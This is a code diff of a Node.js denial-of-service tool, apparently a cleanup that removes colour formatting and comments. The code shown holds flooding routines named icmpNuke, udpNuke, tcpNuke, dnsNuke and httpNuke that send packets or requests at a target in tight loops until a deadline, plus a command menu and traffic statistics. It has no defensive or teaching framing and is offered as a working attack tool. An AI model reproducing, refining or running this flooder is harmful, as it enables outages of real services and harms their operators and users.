@@ -1,10 +1,10 @@
+// Cleaned version without chalk or any color formatting
 const readline = require('readline');
 const raw = require('raw-socket');
 const dgram = require('dgram');
 const process = require('process');
 const net = require('net');
 const http = require('http');
-const chalk = require('chalk'); // For color effects
 
 const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
 
@@ -41,7 +41,7 @@ async function init() {
     const command = cmd.toUpperCase();
 
     if (command === "ZXPING") {
-        return zxping(); // Calls the zxping function
+        return zxping();
     }
 
     const isIRIR = command === 'IRIR-PANZERFAUST';
@@ -81,25 +81,19 @@ async function zxping() {
             const end = Date.now();
             const pingTime = end - start;
             pingStats.pingCount++;
-            const color = getPingColor(pingTime);
-            console.log(`${color}${ip}:${port} - ${pingTime}ms`);
+            console.log(`${ip}:${port} - ${pingTime}ms`);
+            sock.destroy();
         });
         sock.on('error', (err) => {
-            console.log(chalk.red(`${ip}:${port} - Error: ${err.message}`));
+            console.log(`${ip}:${port} - Error: ${err.message}`);
         });
     }, 1000);
 }
 
-function getPingColor(time) {
-    if (time < 50) return chalk.green;
-    if (time < 150) return chalk.yellow;
-    return chalk.red;
-}
-
 function icmpNuke(target, endTime) {
     const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });
-    const buffer = Buffer.alloc(1024); // Increased packet size
-    buffer.writeUInt8(8, 0); // ICMP Echo Request
+    const buffer = Buffer.alloc(1024);
+    buffer.writeUInt8(8, 0);
     buffer.writeUInt8(0, 1);
 
     const blast = () => {
@@ -119,7 +113,7 @@ function icmpNuke(target, endTime) {
 
 function udpNuke(target, port, endTime) {
     const sock = dgram.createSocket("udp4");
-    const buffer = Buffer.alloc(1500); // Increased packet size
+    const buffer = Buffer.alloc(1500);
     const blast = () => {
         if (Date.now() > endTime) return endAttack();
         sock.send(buffer, 0, buffer.length, port, target, (err) => {
@@ -139,7 +133,7 @@ function tcpNuke(target, port, endTime) {
         const client = new net.Socket();
         client.connect(port, target, () => {
             stats.packets++;
-            stats.data += 1024; // Increased packet size
+            stats.data += 1024;
             client.destroy();
         });
         client.on('error', () => {});
@@ -166,12 +160,9 @@ function dnsNuke(target, port, endTime) {
 
 function httpNuke(target, endTime) {
     const headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Connection': 'keep-alive',
-        'Upgrade-Insecure-Requests': '1'
+        'User-Agent': 'Mozilla/5.0',
+        'Accept': '*/*',
+        'Connection': 'keep-alive'
     };
 
     const blast = () => {
@@ -189,10 +180,10 @@ function httpNuke(target, endTime) {
         });
 
         req.on('error', () => {});
-
         req.end();
+
         stats.packets++;
-        stats.data += 1024; // You can adjust this as needed.
+        stats.data += 1024;
         setImmediate(blast);
     };
     blast();
